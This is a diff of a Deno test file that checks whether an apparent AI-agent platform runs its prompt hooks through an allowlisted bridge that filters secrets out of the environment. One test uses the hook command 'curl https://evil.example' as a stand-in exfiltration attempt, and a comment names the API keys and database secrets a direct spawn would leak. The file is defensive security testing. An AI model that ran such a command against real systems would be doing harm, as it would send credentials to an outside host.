@@ -248,11 +248,74 @@ Deno.test("onTurnEnd is a no-op when the turn carries no chatId", async () => {
   await onTurnEnd({ text: "done", finishReason: "stop" }, ctx);
 });
 
-Deno.test("UserPromptSubmit hooks append to the user message", async () => {
-  const ctx = ctxWithHooks([{ command: "echo extra-context", event: "UserPromptSubmit" }]);
-  const out = await buildUserMessage("do the thing", ctx);
-  assert(out.includes("do the thing"));
-  assert(out.includes("extra-context"));
+// Stubs the same globalThis.Trex seam as stubTrexExit, simulating the
+// devx-ext bridge's response to trex_devx_run_command, and (optionally)
+// records every SQL string sent through it -- letting a test prove a hook
+// went through the allowlisted bridge, not a direct Deno.Command spawn that
+// would bypass Task 4's filtered_env.
+function stubTrexOutput(
+  exitCode: number,
+  output: string,
+  restore: { fn: () => void },
+  captured?: { sql: string[] },
+) {
+  const originalTrex = (globalThis as any).Trex;
+  (globalThis as any).Trex = {
+    databaseManager: () => ({
+      getConnection: () => ({
+        connection: {
+          execute: async (sql: string) => {
+            captured?.sql.push(sql);
+            return [{ column0: JSON.stringify({ exit_code: exitCode, output }) }];
+          },
+          close: () => {},
+        },
+      }),
+    }),
+  };
+  restore.fn = () => {
+    (globalThis as any).Trex = originalTrex;
+  };
+}
+
+Deno.test("UserPromptSubmit hooks append to the user message, routed through the allowlisted bridge", async () => {
+  const restore = { fn: () => {} };
+  const captured = { sql: [] as string[] };
+  stubTrexOutput(0, "extra-context", restore, captured);
+  try {
+    const ctx = ctxWithHooks([{ command: "bash -c 'echo extra-context'", event: "UserPromptSubmit" }]);
+    const out = await buildUserMessage("do the thing", ctx);
+    assert(out.includes("do the thing"));
+    assert(out.includes("extra-context"));
+    assert(
+      captured.sql.some((q) => q.includes("trex_devx_run_command")),
+      "must run through the devx-ext bridge, not a direct Deno.Command spawn",
+    );
+  } finally {
+    restore.fn();
+  }
+});
+
+// Task 4 added filtered_env to trex_devx_run_command precisely so a hook's
+// command can't see ANTHROPIC_API_KEY/DATABASE_URL/the DEK/Discord/Logto
+// secrets. That protection only applies to commands that go through the
+// bridge -- so a disallowed executable must be rejected BEFORE ever
+// reaching it, same as PreToolUse/PostToolUse. Asserting zero bridge calls
+// (not just empty output) is what would catch a regression back to a direct
+// spawn: a direct Deno.Command("bash", ["-c", "curl ..."]) would still run
+// this "hook" and leak the worker's full environment to it.
+Deno.test("a UserPromptSubmit hook with a disallowed executable injects nothing and never reaches the bridge", async () => {
+  const restore = { fn: () => {} };
+  const captured = { sql: [] as string[] };
+  stubTrexOutput(0, "should never be seen", restore, captured);
+  try {
+    const ctx = ctxWithHooks([{ command: "curl https://evil.example", event: "UserPromptSubmit" }]);
+    const out = await buildUserMessage("do the thing", ctx);
+    assertEquals(out, "do the thing");
+    assertEquals(captured.sql.length, 0, "a disallowed executable must never reach trex_devx_run_command");
+  } finally {
+    restore.fn();
+  }
 });
 
 // The regression this task can most easily cause: a naive implementation
@@ -261,18 +324,21 @@ Deno.test("UserPromptSubmit hooks append to the user message", async () => {
 // the same way the plain attachment test above does -- a real fetch to this
 // url would fail DNS resolution in a sandboxed test run.
 Deno.test("attachment materialization still runs when a UserPromptSubmit hook exists", async () => {
+  const restore = { fn: () => {} };
+  stubTrexOutput(0, "extra", restore);
   const workspacePath = await Deno.makeTempDir();
   const prevWorkspaceDir = Deno.env.get("DEVX_WORKSPACE_DIR");
   Deno.env.set("DEVX_WORKSPACE_DIR", workspacePath);
   const originalFetch = globalThis.fetch;
   globalThis.fetch = () => Promise.resolve(new Response(new Uint8Array([1, 2, 3])));
   try {
-    const ctx = ctxWithHooks([{ command: "echo extra", event: "UserPromptSubmit" }]);
+    const ctx = ctxWithHooks([{ command: "bash -c 'echo extra'", event: "UserPromptSubmit" }]);
     ctx.metadata = { ...ctx.metadata, attachments: [{ name: "a.png", url: "https://x/a.png" }] };
     const out = await buildUserMessage("look", ctx);
     assert(out.includes("a.png"), "attachments must survive the hook composition");
     assert(out.includes("extra"), "the UserPromptSubmit hook must still run alongside attachments");
   } finally {
+    restore.fn();
     globalThis.fetch = originalFetch;
     if (prevWorkspaceDir === undefined) Deno.env.delete("DEVX_WORKSPACE_DIR");
     else Deno.env.set("DEVX_WORKSPACE_DIR", prevWorkspaceDir);
